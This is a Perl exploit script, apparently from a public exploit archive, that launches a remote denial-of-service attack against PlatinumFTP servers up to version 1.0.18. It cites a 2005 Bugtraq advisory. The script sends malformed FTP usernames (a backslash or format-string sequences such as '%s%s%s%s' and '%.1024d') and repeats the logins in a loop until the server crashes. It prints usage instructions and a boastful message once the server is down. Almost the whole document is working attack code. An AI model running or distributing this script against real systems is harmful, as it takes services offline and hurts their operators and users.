PlatinumFTP <= 1.0.18 Multiple Remote Denial of Service Exploit
===============================================================



#!/usr/bin/perl
#
# pftpdos-ai1.pl - Remote DoS against PlatinumFTP 10.1.18
# Details:http://seclists.org/lists/bugtraq/2005/Mar/0222.html
#
# If you don&#039;t get the server down try to change/play a little bit with
# the Timeout
#
# ports at securityforest dot com | greetings to muts, barabas, s|33py,
# revised and all guys at www.whitehat.co.il
#
# Thanks to str0ke from milw0rm for forcing me to shrink 3 PoCs into 1 :)
#
# 2005/05/03 portsonline.net

use strict;
use Net::FTP;

my $host;
my $username;
my $dostype;

if ($#ARGV < 1) { &syntax(); }

$host = $ARGV[0];
$dostype = $ARGV[1];

if ($dostype == &#039;1&#039;) { $username = &#039;\\&#039;; }
if ($dostype == &#039;2&#039;) { $username = &#039;%s%s%s%s&#039;; }
if ($dostype == &#039;3&#039;) { $username = &#039;%.1024d&#039;; }

my $ftp = Net::FTP->new($host, Timeout => 2, Debug => 0, Port => 21)
or die "can you see a ftp server? i can&#039;t.\n";

print "denial of service tpye $dostype in progress\n";

while (my $ftp = Net::FTP->new($host, Timeout => 2, Debug => 0, Port => 21))
{
    my $ftp = Net::FTP->new($host, Timeout => 0.1, Debug => 0, Port => 21);
    $ftp->login($username);
}

print "server is down. now run forest, RUN!\n";

sub syntax {
    print "Usage: pftpdos-ai1.pl IP DOSTYPE(1-3)\n\n";
    print "DOSTYPE: 1 Using &#039;\\&#039; Username \n";
    print "DOSTYPE: 2 Using &#039;%s%s%s%s&#039; Username \n";
    print "DOSTYPE: 3 Using &#039;%.1024d&#039; Username \n";
    exit (1);
}



